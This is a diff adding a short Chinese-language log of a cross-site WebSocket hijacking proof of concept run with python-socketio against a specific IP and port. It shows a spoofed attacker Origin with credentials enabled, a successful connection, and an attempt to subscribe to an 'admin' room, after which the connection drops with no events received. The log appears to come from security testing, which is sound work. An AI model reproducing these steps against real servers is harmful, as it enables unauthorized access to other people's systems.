@@ -1,0 +1,18 @@
+[2026-08-30T10:56:47.945917Z] Stage 7b - python-socketio 官方客户端 CSWSH PoC
+[2026-08-30T10:56:47.946252Z] 目标: http://35.234.50.28:3100
+[2026-08-30T10:56:47.946368Z] Origin: https://attacker.example
+[2026-08-30T10:56:47.946467Z] withCredentials: True
+
+[2026-08-30T10:56:47.946847Z] → connect(...)
+[2026-08-30T10:56:47.965687Z] [CLIENT EVENT] connect
+[2026-08-30T10:56:47.966188Z] ✓ connect() 返回 (connected=True, sid=i1b_0Vod6eAVbjkHAAAh)
+[2026-08-30T10:56:47.966616Z] ✓ 客户端已 connected - CSWSH 攻击面验证通过
+[2026-08-30T10:56:47.966804Z] 
+→ 订阅业务事件（任意 roomName）
+[2026-08-30T10:56:47.967872Z]   ✓ emit('client.subscribe', {roomName: 'admin'})
+[2026-08-30T10:56:47.968545Z] 
+→ 等待 5 秒看是否收到服务端推送...
+[2026-08-30T10:56:48.384524Z] [CLIENT EVENT] disconnect reason=transport error
+[2026-08-30T10:56:52.974187Z] 
+收到事件数: 0
+[2026-08-30T10:56:52.974862Z] → disconnect() 完成
